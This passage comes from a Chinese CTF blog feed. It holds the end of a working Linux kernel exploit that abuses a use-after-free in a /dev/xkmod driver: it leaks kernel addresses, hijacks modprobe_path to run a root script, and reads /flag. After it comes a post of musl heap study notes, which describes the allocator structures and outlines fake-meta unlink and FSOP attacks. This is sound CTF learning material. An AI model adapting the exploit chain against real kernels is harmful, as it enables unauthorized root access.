*buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Data</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span> *ptr;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> length;</span><br><span class="line">&#125;data;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> dev_fd, <span class="keyword">struct</span> Data *data)</span>&#123;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0x1111111</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">(<span class="type">int</span> dev_fd, <span class="keyword">struct</span> Data *data)</span>&#123;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0x6666666</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">(<span class="type">int</span> dev_fd, <span class="keyword">struct</span> Data *data)</span>&#123;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0x7777777</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> dev_fd[<span class="number">5</span>], root_script_fd, flag_fd;</span><br><span class="line">    <span class="type">size_t</span> kernel_heap_leak, kernel_text_leak;</span><br><span class="line">    <span class="type">size_t</span> kernel_base, kernel_offset, page_offset_base;</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">0x100</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Data</span> <span class="title">data</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* fundamental works */</span></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        dev_fd[i] = open(<span class="string">&quot;/dev/xkmod&quot;</span>, O_RDONLY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* create fake modprobe_path file */</span></span><br><span class="line">    root_script_fd = open(ROOT_SCRIPT_PATH, O_RDWR | O_CREAT);</span><br><span class="line">    write(root_script_fd, root_cmd, <span class="keyword">sizeof</span>(root_cmd));</span><br><span class="line">    close(root_script_fd);</span><br><span class="line">    system(<span class="string">&quot;chmod +x &quot;</span> ROOT_SCRIPT_PATH);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* construct UAF */</span></span><br><span class="line">    data.ptr = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    data.offset = <span class="number">0</span>;</span><br><span class="line">    data.length = <span class="number">0x50</span>;</span><br><span class="line">    <span class="built_in">memset</span>(data.ptr, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    add(dev_fd[<span class="number">0</span>], &amp;data);</span><br><span class="line">    edit(dev_fd[<span class="number">0</span>], &amp;data);</span><br><span class="line">    close(dev_fd[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* leak kernel heap addr and guess the page_offset_base */</span></span><br><span class="line">    show(dev_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    kernel_heap_leak = data.ptr[<span class="number">0</span>];</span><br><span class="line">    page_offset_base = kernel_heap_leak &amp; <span class="number">0xfffffffff0000000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel heap leak: 0x%lx\n&quot;</span>, kernel_heap_leak);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] GUESSING page_offset_base: 0x%lx\n&quot;</span>, page_offset_base);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* try to alloc fake chunk at (page_offset_base + 0x9d000 - 0x10) */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] leaking kernel base...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    data.ptr[<span class="number">0</span>] = page_offset_base + <span class="number">0x9d000</span> - <span class="number">0x10</span>;</span><br><span class="line">    data.offset = <span class="number">0</span>;</span><br><span class="line">    data.length = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    edit(dev_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    add(dev_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    add(dev_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line"></span><br><span class="line">    data.length = <span class="number">0x40</span>;</span><br><span class="line">    show(dev_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    <span class="keyword">if</span> ((data.ptr[<span class="number">2</span>] &amp; <span class="number">0xfff</span>) != <span class="number">0x30</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] invalid data leak: 0x%lx\n&quot;</span>, data.ptr[<span class="number">2</span>]);</span><br><span class="line">        err_exit(<span class="string">&quot;\033[31m\033[1m[x] FAILED TO HIT page_offset_base! TRY AGAIN!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_base = data.ptr[<span class="number">2</span>] - <span class="number">0x30</span>;</span><br><span class="line">    kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    hexx(<span class="string">&quot;kernel base&quot;</span>, kernel_base);</span><br><span class="line">    hexx(<span class="string">&quot;kernel offset&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the modprobe_path, we&#x27;ll let it requesting new slub page for it */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking modprobe_path...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    add(dev_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    close(dev_fd[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    data.ptr[<span class="number">0</span>] = kernel_offset + MODPROBE_PATH - <span class="number">0x10</span>;</span><br><span class="line">    data.offset = <span class="number">0</span>;</span><br><span class="line">    data.length = <span class="number">0x8</span>;</span><br><span class="line"></span><br><span class="line">    edit(dev_fd[<span class="number">2</span>], &amp;data);</span><br><span class="line">    add(dev_fd[<span class="number">2</span>], &amp;data);</span><br><span class="line">    add(dev_fd[<span class="number">2</span>], &amp;data);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span> *) &amp;data.ptr[<span class="number">2</span>], ROOT_SCRIPT_PATH);</span><br><span class="line">    data.length = <span class="number">0x30</span>;</span><br><span class="line">    edit(dev_fd[<span class="number">2</span>], &amp;data);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* trigger the fake modprobe_path */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigerring fake modprobe_path...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /home/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/home/fake&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read flag */</span></span><br><span class="line">    <span class="built_in">memset</span>(flag, <span class="number">0</span>, <span class="keyword">sizeof</span>(flag));</span><br><span class="line">    </span><br><span class="line">    flag_fd = open(<span class="string">&quot;/flag&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (flag_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;failed to chmod flag!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    read(flag_fd, flag, <span class="keyword">sizeof</span>(flag));</span><br><span class="line">    hexx(<span class="string">&quot;flag&quot;</span>, flag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>初探musl</title>
      <link href="/2024/01/17/musl/"/>
      <url>/2024/01/17/musl/</url>
      
        <content type="html"><![CDATA[<p>其实就是对各位大佬博客的各种摘抄和总结···，方便自己以后做题</p><h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><p>chunk:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line"> <span class="type">char</span> prev_user_data[];</span><br><span class="line">    <span class="type">uint8_t</span> idx;  <span class="comment">//低5bit为idx第几个chunk</span></span><br><span class="line">    <span class="type">uint16_t</span> offset; <span class="comment">//与第一个chunk起始地址的偏移，实际地址偏移为offset * UNIT,详细请看get_meta源码中得到group地址的而过程！</span></span><br><span class="line">    <span class="type">char</span> data[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在释放后 <code>chunk</code> 头的 <code>idx</code>会变成<code>0xff</code> <code>offset</code> 会清零</p><h3 id="group"><a href="#group" class="headerlink" title="group:"></a>group:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> UNIT 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IB 4</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> active_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="type">char</span> pad[UNIT - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];<span class="comment">//padding=0x10B</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> storage[];<span class="comment">// chunks</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在<code>musl</code>中同一类大小的<code>chunk</code>都是被分配到同一个<code>group</code>中进行管理</p><h3 id="meta"><a href="#meta" class="headerlink" title="meta:"></a>meta:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span><span class="comment">//双向链表</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span><span class="comment">// 这里指向管理的group 地址</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;<span class="comment">// bitmap 的形式体现 chunk 的状态</span></span><br><span class="line">    <span class="type">uintptr_t</span> last_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> freeable:<span class="number">1</span>;<span class="comment">// 代表meta否可以被回收 freeable=0 代表不可以 =1 代表可以</span></span><br><span class="line">    <span class="type">uintptr_t</span> sizeclass:<span class="number">6</span>;<span class="comment">// sizeclass=6 表示由0x6这个group进行管理这一类的大小的chunk</span></span><br><span class="line">    <span class="type">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="type">uintptr_t</span>)<span class="number">-12</span>;<span class="comment">// meta-&gt;maplen = (needed+4095)/4096</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>maplen &gt;&#x3D; 1表示这个<code>meta</code>里的<code>group</code>是新<code>mmap</code>出来的,长度为多少,并且这个<code>group</code> 不在<code>size_classes</code>里<br>maplen &#x3D;0 表示<code>group</code>不是新<code>mmap</code>出来的在<code>size_classes</code>里<br>细节：</p><ul><li><code>meta</code>一般申请的是堆空间<code>brk</code>分配的，有可能是<code>mmap</code>映射的，而<code>group</code>都是使用的<code>mmap</code>的空间</li><li>由于<code>bitmap</code>的限制,因此一个<code>group</code>中最多只能有<code>32</code>个<code>chunk</code></li></ul><h3 id="meta-area"><a href="#meta-area" class="headerlink" title="meta_area:"></a>meta_area:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> check;<span class="comment">// 是个校验数字 保护meta_area 里的meta，防止meta被 伪造</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span><span class="comment">// 指向下一个meta_area 如果没有 就默认为0</span></span><br><span class="line">    <span class="type">int</span> nslots;<span class="comment">// meta 槽的数量</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>meta_area 是管理<code>meta</code>的合集 <code>meta_area</code> 以页为单位分配</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> <span class="title">area</span> =</span> (<span class="type">void</span> )((<span class="type">uintptr_t</span>)meta &amp; <span class="number">-4096</span>)</span><br></pre></td></tr></table></figure><p>细节：</p><ul><li>在这个<code>meta_area</code>页被使用的时候，上一个临近的页会被设置为不可写是为了防止 使用者覆盖<code>check</code>校验值</li></ul><h3 id="malloc-context"><a href="#malloc-context" class="headerlink" title="__malloc_context:"></a>__malloc_context:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> secret;<span class="comment">// 和meta_area 头的check 是同一个值 就是校验值</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PAGESIZE</span></span><br><span class="line">    <span class="type">size_t</span> pagesize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">int</span> init_done;<span class="comment">//是否初始化标记</span></span><br><span class="line">    <span class="type">unsigned</span> mmap_counter;<span class="comment">// 记录有多少mmap 的内存的数量</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span><span class="comment">// 被free 的meta 头 这里meta 管理使用了队列和双向循环链表</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span><span class="comment">//指向可用meta数组</span></span><br><span class="line">    <span class="type">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *avail_meta_areas;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span><span class="comment">// 记录着可用的meta</span></span><br><span class="line">    <span class="type">size_t</span> u sage_by_class[<span class="number">48</span>];</span><br><span class="line">    <span class="type">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line">    <span class="type">uint8_t</span> seq;</span><br><span class="line">    <span class="type">uintptr_t</span> brk;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>是<code>musl libc</code>记录结构状态的表，记录各个<code>meta</code> 和 <code>secret</code> 队列信息等</p><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><ul><li><code>musl</code> 中堆的管理由<code>meta</code> 管理 <code>group</code> ，<code>group</code> 管理 <code>chunk</code></li><li>在<code>free</code> 或者 <code>malloc chunk</code> 的时候又是从 <code>chunk</code> 到<code>group</code> 再到<code>meta</code> 从小到大索引</li><li><code>meta</code> 间通过<code>meta</code> 中<code>prev next</code> 结构形成循环链表连接</li></ul><h2 id="gdb调试技巧"><a href="#gdb调试技巧" class="headerlink" title="gdb调试技巧"></a>gdb调试技巧</h2><p>下载<code>xf1le</code>师傅的<code>gdb</code>插件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/xf1les/muslheap.git  </span><br><span class="line">echo &quot;source /path/to/muslheap.py&quot; &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure><h3 id="mheap"><a href="#mheap" class="headerlink" title="mheap"></a>mheap</h3><p>可以查看<code>__malloc_context</code>的部分信息，可以详细看到每一条<code>meta</code>链表</p><img src="/2024/01/17/musl/1.png" class="" title="我的图图呢">  <h3 id="p-malloc-context"><a href="#p-malloc-context" class="headerlink" title="p __malloc_context"></a>p __malloc_context</h3><p>可以查看<code>__malloc_context</code>的详细信息，但无法详细看到每一条<code>meta</code>链表</p><img src="/2024/01/17/musl/2.png" class="" title="我的图图呢">  <h3 id="mmagic"><a href="#mmagic" class="headerlink" title="mmagic"></a>mmagic</h3><p>用于查看关键函数的地址</p><img src="/2024/01/17/musl/3.png" class="" title="我的图图呢">  <h3 id="p-struct-meta"><a href="#p-struct-meta" class="headerlink" title="p (struct meta)&lt;meta地址&gt;"></a>p <em>(struct meta</em>)&lt;meta地址&gt;</h3><p>查看某个<code>meta</code>结构体的详细信息</p><img src="/2024/01/17/musl/4.png" class="" title="我的图图呢">  <h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><p>这里直接贴上<code>0xRGz</code>师傅的文章</p><img src="/2024/01/17/musl/5.png" class="" title="我的图图呢">  <h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><p>这里一样直接贴上<code>0xRGz</code>师傅的文章<code>Orz</code><br>free流程：</p><ul><li>通过<code>get_meta(p)</code>得到<code>meta</code> (<code>get_meta</code> 是通过<code>chunk</code> 对应的<code>offset</code> 索引到对应的<code>group</code> 再索引到<code>meta</code>) 下面会详细介绍<code>get_meta</code></li><li>通过<code>get_slot_index(p)</code>得到对应<code>chunk</code>的 <code>idx</code> -&gt; 通过<code>get_nominal_size(p, end)</code> 算出真实大小</li><li>重置<code>idx</code> 和 <code>offset idx</code> 被置为<code>0xff</code> 标记<code>chunk</code></li><li>修改<code>freed_mask</code> 标记<code>chunk</code>被释放</li><li>最后调用<code>nontrivial_free</code> 完成关于<code>meta</code>一些剩余操作</li></ul><h2 id="pwn题常用技巧"><a href="#pwn题常用技巧" class="headerlink" title="pwn题常用技巧"></a>pwn题常用技巧</h2><p>一般有如下几种利用方法，核心原理都是构造假的<code>chunk</code> 索引到假的<code>group</code> 从而所引导假的<code>meta</code>或覆盖<code>group</code> 中指向<code>meta</code> 的指针 覆盖为假的<code>meta</code> ，然后使得假的<code>meta dequeue</code> 最终实现<code>unlink</code><br>(构造<code>fake_meta</code> 需要先泄露 <code>secret</code> 校验值)<br>1、伪造<code>meta</code> 后满足各种条件 使得其进入<code>dequeue</code> 通过<code>unlink</code>,构造<code>prev</code>,<code>next</code> 实现任意地址指针互写<br>通过任意地址互写指针，向<code>stdout_used</code> 写入我们伪造的<code>fake_stdout</code>地址， 通过<code>IO_FILE</code> 劫持程序执行流<br>到我们布置好的<code>fake_stdout</code> 上，可以找<code>IO_FILE</code> 里的一些函数<code>exit puts</code>在<code>fake_stdout</code>上布置<code>rop_chain</code>然后通过栈迁移的<code>gadget</code> 利用<code>FSOP</code> 劫持程序到布置的<code>fake_stdout</code>上<br>2、伪造<code>fake_meta</code> 也是任意地址指针互写，先进行布局使得 <code>fake_meta dequeue</code> 实现<code>unlink</code>，再利用指针互写 修改<code>fake_meta</code> 中的<code>mem</code>(<code>mem</code> 就是<code>group</code> 区域) ，把<code>mem</code> 修改为我们想要的地址，然后让<code>fake_meta</code> 通过<code>queue</code> 入队，可以实现任意地址分配的，然后同样是打 <code>IO_FILE</code> 通过修改<code>stdout stdin</code> 和<code>stderr</code> 结构体 劫持程序流</p><h2 id="补充：部分重要函数源码"><a href="#补充：部分重要函数源码" class="headerlink" title="补充：部分重要函数源码"></a>补充：部分重要函数源码</h2><h3 id="malloc-1"><a href="#malloc-1" class="headerlink" title="malloc"></a>malloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">malloc</span><span class="params">(<span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (size_overflows(n)) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">// 最大申请空间限制</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span>;</span></span><br><span class="line">    <span class="type">uint32_t</span> mask, first;</span><br><span class="line">    <span class="type">int</span> sc;</span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="type">int</span> ctr;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (n &gt;= MMAP_THRESHOLD) &#123;<span class="comment">// size &gt;= 阈值 会直接通过mmap 申请空间</span></span><br><span class="line">        <span class="type">size_t</span> needed = n + IB + UNIT; <span class="comment">//UNIT 0x10 IB 4 定义在meta.h 里 这里UNIT + IB 是一个基本头的大小</span></span><br><span class="line">        <span class="type">void</span> *p = mmap(<span class="number">0</span>, needed, PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);<span class="comment">//新mmap group 空间</span></span><br><span class="line">        <span class="keyword">if</span> (p==MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        wrlock();</span><br><span class="line">        step_seq();</span><br><span class="line">        g = alloc_meta();</span><br><span class="line">        <span class="keyword">if</span> (!g) &#123; <span class="comment">// 如果申请meta 失败 会把刚刚mmap 出来的group 回收</span></span><br><span class="line">            unlock();</span><br><span class="line">            munmap(p, needed);<span class="comment">// 回收group</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        g-&gt;mem = p;<span class="comment">// mem = group 地址</span></span><br><span class="line">        g-&gt;mem-&gt;meta = g; <span class="comment">//group 头部 指向meta (g 为 meta)</span></span><br><span class="line">        g-&gt;last_idx = <span class="number">0</span>;<span class="comment">//mmap的group last_idx默认值=0</span></span><br><span class="line">        g-&gt;freeable = <span class="number">1</span>;</span><br><span class="line">        g-&gt;sizeclass = <span class="number">63</span>; <span class="comment">// mmap 的申请的 sizeclass 都为63</span></span><br><span class="line">        g-&gt;maplen = (needed+<span class="number">4095</span>)/<span class="number">4096</span>;</span><br><span class="line">        g-&gt;avail_mask = g-&gt;freed_mask = <span class="number">0</span>;</span><br><span class="line">        ctx.mmap_counter++;<span class="comment">// mmap 内存记载数量++</span></span><br><span class="line">        idx = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">goto</span> success;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//否则直接根据传入size，转换成size_classes的对应大小的 下标，</span></span><br><span class="line">    sc = size_to_class(n);</span><br><span class="line"> </span><br><span class="line">    rdlock();</span><br><span class="line">    g = ctx.active[sc]; <span class="comment">// 从现有的active中取出对应sc 的 meta ,不同sc 对应不同的meta</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    如果从ctx.active 中没找到对应的meta 会执行下面的if分支</span></span><br><span class="line"><span class="comment">    这里!g&lt;=&gt; g==0 ,说明ctx.active[sc] 没有对应的meta</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (!g &amp;&amp; sc&gt;=<span class="number">4</span> &amp;&amp; sc&lt;<span class="number">32</span> &amp;&amp; sc!=<span class="number">6</span> &amp;&amp; !(sc&amp;<span class="number">1</span>) &amp;&amp; !ctx.usage_by_class[sc]) &#123;</span><br><span class="line">        <span class="type">size_t</span> usage = ctx.usage_by_class[sc|<span class="number">1</span>];<span class="comment">// 如果在 ctx.active 没找到 就使用更大size group 的meta</span></span><br><span class="line">        <span class="comment">// if a new group may be allocated, count it toward</span></span><br><span class="line">        <span class="comment">// usage in deciding if we can use coarse class.</span></span><br><span 